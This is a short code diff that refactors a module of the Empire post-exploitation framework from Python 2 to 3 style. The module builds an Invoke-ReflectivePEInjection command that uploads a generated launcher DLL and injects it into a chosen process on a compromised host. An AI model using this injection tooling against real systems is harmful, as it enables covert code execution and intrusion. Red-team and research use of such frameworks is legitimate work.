@@ -1,15 +1,12 @@
-from __future__ import print_function
-
 import random
 import string
-from builtins import object, str
 from typing import Dict
 
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -77,8 +74,9 @@ class Module(object):
                 launcher_code = launcher.split(" ")[-1]
 
                 script_end += (
-                    "Invoke-ReflectivePEInjection -PEPath %s -ProcName %s "
-                    % (full_upload_path, proc_name)
+                    "Invoke-ReflectivePEInjection -PEPath {} -ProcName {} ".format(
+                        full_upload_path, proc_name
+                    )
                 )
                 dll = main_menu.stagers.generate_dll(launcher_code, arch)
                 upload_script = main_menu.stagers.generate_upload(dll, full_upload_path)
